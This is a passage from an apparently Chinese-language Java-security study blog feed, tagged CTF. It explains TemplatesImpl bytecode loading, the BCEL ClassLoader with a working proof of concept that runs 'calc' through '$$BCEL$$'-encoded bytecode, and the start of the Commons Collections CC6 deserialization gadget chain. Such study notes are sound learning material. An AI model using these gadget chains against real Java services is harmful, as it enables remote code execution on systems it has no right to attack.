class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="comment">// 2. 设置_bytecodes，放入恶意类就好</span></span><br><span class="line">            setFieldValue(triggerObj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;payload&#125;);</span><br><span class="line">            <span class="comment">// 3. 设置_tfactory，从类中copy的</span></span><br><span class="line">            setFieldValue(triggerObj,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>() );</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 触发调用点 * * * * * */</span></span><br><span class="line">            triggerObj.newTransformer();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field_name, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field_name);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="补充-对于-tfactory参数一些误解的修正"><a href="#补充-对于-tfactory参数一些误解的修正" class="headerlink" title="补充: 对于_tfactory参数一些误解的修正"></a>补充: 对于_tfactory参数一些误解的修正</h4><blockquote><p>对于反序列化和序列化还要<strong>注意一下transient这个修饰符</strong></p></blockquote><ol><li>(新的点)首先，<code>private transient TransformerFactoryImpl _tfactory = null;</code>中这个属性是无法被序列化的，查看该类的readObject()后发现在函数尾部有<code>_tfactory = new TransformerFactoryImpl();</code><ol><li><strong>所以<code>setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</code>有没有都不改变结果</strong></li></ol></li><li>(上面已经发现)其次从顺序角度来看，即使不进行设置，后续由于调用顺序，也会先加载完我们这个类</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span>  <span class="title function_">readObject</span><span class="params">(ObjectInputStream is)</span></span><br><span class="line">      <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET);</span><br><span class="line">            <span class="keyword">if</span> (temp == <span class="literal">null</span> || !(temp.length()==<span class="number">0</span> || temp.equalsIgnoreCase(<span class="string">&quot;true&quot;</span>))) &#123;</span><br><span class="line">                <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.DESERIALIZE_TRANSLET_ERR);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        is.defaultReadObject();</span><br><span class="line">        <span class="keyword">if</span> (is.readBoolean()) &#123;</span><br><span class="line">            _uriResolver = (URIResolver) is.readObject();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="BCEL"><a href="#BCEL" class="headerlink" title="BCEL"></a>BCEL</h3><h4 id="什么是BCEL"><a href="#什么是BCEL" class="headerlink" title="什么是BCEL"></a>什么是BCEL</h4><blockquote><p>BCEL的特点在于动态加载字节码，defineClass()也是，这里都是反序列化时的中一个重点<br>在Fastjson漏洞中有所利用</p></blockquote><ol><li><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，比Commons Collections特殊的一点是，<strong>它被包含在了原生的JDKcom.sun.org.apache.bcel中</strong></p><ol><li>BCEL 提供了两个核心类，即 com.sun.org.apache.bcel.internal.Repository 和 com.sun.org.apache.bcel.internal.Utility<ol><li>Repository 用于管理已加载的类和其对应的字节码信息，其提供了一个 lookupClass 用以查找已加载的类；</li><li>Utility 则提供了一系列静态方法用于操作字节码，例如对打印或编码字节码。</li></ol></li></ol></li><li><p>BCEL的主要特点包括: BCEL库提供了一系列用于分析、创建、修改Java Class文件的API</p><ol><li>字节码分析：能够解析已有的.class文件，提取其中的方法、字段、属性等信息。</li><li><strong>字节码生成</strong>：支持从头开始构建新的Java类文件，这在需要动态生成类的场景下非常有用。</li><li><strong>字节码转换</strong>：可以在运行时修改现有的字节码，例如插入额外的指令来实现性能监视或安全性检查。</li><li>字节码优化：可以对字节码进行优化，提高程序执行效率</li></ol></li><li><p>BCEL还实现了自己的ClassLoader: <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，重写了Java内置的ClassLoader#loadClass()方法，并提供了多种对字节码的操作(新方法)</p><ol><li>这里会判断是否为<code>$$BCEL$$</code>开头，然后进入createClass()，进入createClass后会对字节码进行decode()，最终的字节码格式是被BCEL自定义的 –&gt; <strong>所以需要自己的ClassLoader</strong>，在ClassLoader#loadClass()中，其会判断类名是否是<code>$$BCEL$$</code>开头，如果是的话，将会对这个字符串进行decode。</li><li>p牛说decode()中: “基本可以理解为是传统字节码的HEX编码，再将反斜线替换成$。默认情况下外层还会加一层GZip压缩”，我就先不看了有需要再来</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line"><span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First try: lookup hash table.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span>((cl=(Class)classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">/* Second try: Load system class using system class loader. You better</span></span><br><span class="line"><span class="comment">     * don&#x27;t mess around with them.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">        cl = deferTo.loadClass(class_name);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cl == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">        clazz = createClass(class_name);</span><br><span class="line">      <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">        <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">          clazz = modifyClass(clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">        cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">        cl = Class.forName(class_name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(resolve)</span><br><span class="line">      resolveClass(cl);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> cl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="BCEL前因后果的补充-不重要"><a href="#BCEL前因后果的补充-不重要" class="headerlink" title="BCEL前因后果的补充(不重要"></a>BCEL前因后果的补充(不重要</h4><blockquote><p>补充了一个研究的思路：查看更新日志（修复日志），比如java的bugfixes[<a href="https://www.oracle.com/java/technologies/javase/8u251-bugfixes.html]">https://www.oracle.com/java/technologies/javase/8u251-bugfixes.html]</a></p></blockquote><ol><li>前因<ol><li><strong>内置在jdk？</strong>: 据p牛（不严谨）的考证，JDK会将BCEL放到自己的代码中，主要原因是为了支撑Java XML相关的功能<ol><li>Java XML功能包含了JAXP规范，而Java中自带的JAXP实现使用了Apache Xerces和Apache Xalan，Apache Xalan又依赖了BCEL，所以BCEL也被放入了标准库中</li></ol></li><li><strong>什么是JAXP</strong>: JAXP全名是Java API for XML Processing，他是Java定义的一系列接口，用于处理XML相关的逻辑(包括DOM、SAX、StAX、XSLT等)。Apache Xalan实现了其中XSLT相关的部分，其中包括xsltc compiler</li><li><strong>什么是XSLT</strong>: XSLT（扩展样式表转换语言）是一种为可扩展置标语言提供表达形式而设计的计算机语言，主要用于将XML转换成其他格式的数据。既然是一门动态“语言”，在Java中必然会先被编译成Java，才能够执行。</li><li><strong>XSLT Compiler</strong>: 是一个命令行编译器，可以<strong>将一个xsl文件编译成一个class文件或jar文件</strong>，编译后的class被称为translet，可以在后续用于对XML文件的转换。 –&gt; <strong>将XSLT的功能转化成了Java代码</strong>，优化执行的速度，如果我们不使用这个命令行编译器进行编译，Java内部也会在运行过程中存在编译的过程</li><li><strong>联系回到AbstactTranslet了</strong>: 之前在TemplatesImpl这条利用链时有使用过，它在defineClass中需要的字节码所对应的基类<ol><li>TemplatesImpl是对JAXP标准中javax.xml.transform.Templates接口的实现，前文说了，XSLT在使用时会先编译成Java字节码，这也就是为什么TemplatesImpl会使用defineClass的原因 –&gt; <strong>将xml等的字节码变成可以使用的类</strong></li></ol></li></ol></li><li>后果<ol><li>bcel依赖中还有ClassLoader，但是java中内置的没有了，应该时有再加工</li></ol></li></ol><h4 id="BCEL-poc"><a href="#BCEL-poc" class="headerlink" title="BCEL poc"></a>BCEL poc</h4><blockquote><p>BCEL是由版本限制的<br>BCEL 在 Java 8u251 及之后的版本中无法使用，这是由于在后续的版本中 com.sun.org.apache.bcel.internal.util.ClassLoader 已被移除</p></blockquote><ol><li>在实例化时调用也可以用静态代码块static来实现，在实例化时自动调用，和<strong>构造函数</strong>效果一样<ol><li>在Java安全3(1)中有提到过static的问题<ol><li>Class.forName()在类加载时就执行static块(可选)</li><li>ClassLoader.loadClas()在加载类时不会执行static块，只会在实例化进行</li></ol></li></ol></li><li>这一个poc的关键是<ol><li>使用到了bcel库中自定义的ClassLoader来进行加载，提供了使用bcel的条件</li><li><code>com.sun.org.apache.bcel.internal.Repository</code>和<code>com.sun.org.apache.bcel.internal.classfile.Utility;</code>这两个库</li><li>逻辑：其中 Utility.encode 方法用于将字节数组编码为一个字符串表示形式，如果接受的第二个参数为 true，则会先对字节数组进行 gzip 压缩，然后再进行编码为字符串形式。最后使用bcel的ClassLoader加载类，并实例化触发静态块</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BCELPayload.java 这里需要加入包的标识才可以，可以子本地进行lookup</span></span><br><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELPayload</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// BCELrce.java poc</span></span><br><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELrce</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">JavaClass</span> <span class="variable">jcls</span> <span class="operator">=</span> Repository.lookupClass(BCELPayload.class);</span><br><span class="line">            <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(jcls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">            System.out.println(code);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>java安全漫谈</li><li><a href="https://0xf4n9x.github.io/java-classloader.html">专门找的博客还是比较对口</a></li><li><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%9F%BA%E7%A1%80/%5BJava%E5%AE%89%E5%85%A8%5D%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E5%AD%A6%E4%B9%A0.md">还是信工所大佬</a></li><li><a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">p牛 becl</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(5)_CC6</title>
      <link href="/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/"/>
      <url>/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/</url>
      
        <content type="html"><![CDATA[<h2 id="高版本的CC链利用解决方案-CC6"><a href="#高版本的CC链利用解决方案-CC6" class="headerlink" title="高版本的CC链利用解决方案:CC6"></a>高版本的CC链利用解决方案:CC6</h2><blockquote><p>在Java 8u71版本以后，CC1的两条利⽤链就不能再被利⽤了，主要原因是内置类方法 <code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code> 的逻辑变化了，无法调用到给定的map的方法而是自己创建了一个linkedxxxMap<br>CC6则是一条可以在高版本利用的一条反序列化链子: 利⽤链可以在Java 7和8的⾼版本触发，没有版本限制</p></blockquote><h2 id="CC6构造分析"><a href="#CC6构造分析" class="headerlink" title="CC6构造分析"></a>CC6构造分析</h2><h3 id="Gadget-Chain"><a href="#Gadget-Chain" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h3><blockquote><p>CC6的构造也是基于LazyMap的，是在CC1基础上拓展出来的</p></blockquote><ol><li>分析一下链子再跟着去看源码<ol><li>看一下下面TiedMapEntry这一个类，结合调用链分析就容易理解了(注意基于CC1而来)</li></ol></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line"> java.io.ObjectInputStream.readObject()</span><br><span class="line">    java.util.HashMap.readObject()</span><br><span class="line">        java.util.HashMap.<span class="built_in">hash</span>()</span><br><span class="line">            org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">            org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                    org.apache.commons.collections.functors.ChainedTransformeretransform()</span><br><span class="line">                        org.apacheecommons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            java.lang.reflect.Method.invoke()</span><br><span class="line">                            java.lang.Runtime.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure><h3 id="org-apache-commons-collections-keyvalue-TiedMapEntry"><a href="#org-apache-commons-collections-keyvalue-TiedMapEntry" class="headerlink" title="org.apache.commons.collections.keyvalue.TiedMapEntry"></a>org.apache.commons.collections.keyvalue.TiedMapEntry</h3><ol><li><p>审计一下，知道总体来说就是一个新的map实体而已，这里没什么特殊</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A Map Entry tied to a map underneath.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * This can be used to enable a map entry to make changes on the underlying</span></span><br><span class="line"><span class="comment"> * map, however this will probably mess up any iterators.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> $Revision: 1.5 $ $Date: 2004/04/09 14:35:10 $</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Stephen Colebourne</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>重点看看hashCode()方法和getXXX()方法</p><ol><li>重点在于<code>getValue()</code>，因为这里会调用到<code>map.get(key)</code>，可以<strong>调用到LazyMap中的get到<code>transform()</code></strong></li><li>又注意到<code>hashCode()</code>方法中会调用到<code>getValue()</code>方法，也是ok</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the key of this entry</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the key</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the value of this entry direct from the map.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the value</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets a hashCode compatible with the equals method.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Implemented per API documentation of &#123;<span class="doctag">@link</span> java.util.Map.Entry#hashCode()&#125;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> a suitable hash code</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="什么是Map-Entry"><a href="#什么是Map-Entry" class="headerlink" title="什么是Map.Entry?"></a>什么是Map.Entry?</h3><ol><li>Map.Entry与Map的关系<ol><li>Map.Entry 接口表示 Map 中的一个条目，即一个键值对。它是 Map 接口中定义的一个静态内部接口。通过 Map.entrySet() 方法可以获取到一个包含所有条目的集合视图，该集合中的每个元素都是一个 Map.Entry 实例</li><li>再idea的debug视图中可以看到<ol><li><img src="/pic/Java%E5%AE%89%E5%85%A85(5)_CC6/MapEntry.png" alt="debug"></li></ol></li></ol></li><li><em><strong>Map.Entry和Map是连接在一起的，但是Map.Entry中的key可以单独存在</strong></em></li></ol><h3 id="我的CC6"><a href="#我的CC6" class="headerlink" title="我的CC6"></a>我的CC6</h3><h4 id="CC6-poc-KC1zs4"><a href="#CC6-poc-KC1zs4" class="headerlink" title="CC6 poc KC1zs4"></a>CC6 poc KC1zs4</h4><ol><li><p>这里先自己从利用链推一下</p><ol><li><p>那就要调用到tme对象的hashCode()方法，想起老朋友HashMap()(readObject()也是可以的)，再回去看</p></li><li><p>嗯可以，看继承关系hashCode()方法是有各个map实现类处理的，HashMap有下面这段，只需要值或者value是一个tme对象就好</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (key==<span class="literal">null</span>   ? <span class="number">0</span> : key.hashCode()) ^</span><br><span class="line">           (value==<span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>总结一下要求</p><ol><li>要求1：将tme对象放到HashMap()中</li><li>要求2：将tme对象的map变为lazyMap+payload</li><li>补一下：对tme对象调用hash会进入内部hashCode在对最底层的map进行处理</li></ol></li><li><p><em><strong>构造poc如下</strong></em></p><ol><li>接下来解读一下逻辑</li></ol><blockquote><p>自己写后参考p牛版本<br>这里有一个小坑点见下Q，可以调试一下来解决&#x2F;逻辑判断一下<br>下面这段poc确实是需要readObject()才会进行触发的</p></blockquote></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 